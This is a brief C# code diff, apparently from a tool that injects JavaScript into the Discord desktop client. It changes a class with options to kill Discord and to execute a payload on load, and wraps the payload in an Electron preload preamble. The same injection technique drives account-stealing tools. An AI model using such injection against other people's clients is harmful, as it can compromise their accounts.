@@ -72,7 +72,7 @@
         public Injection(bool kill, string code, bool executeOnLoad)
         {
             KillDiscord = kill;
-            Payload = code;
+            Payload = $"const electron = require('electron');\nconst currentWindow = electron.remote.getCurrentWindow();\nif (currentWindow.__preload) require(currentWindow.__preload);\n\n{code}";
             ExecuteOnLoad = executeOnLoad;
         }
     }
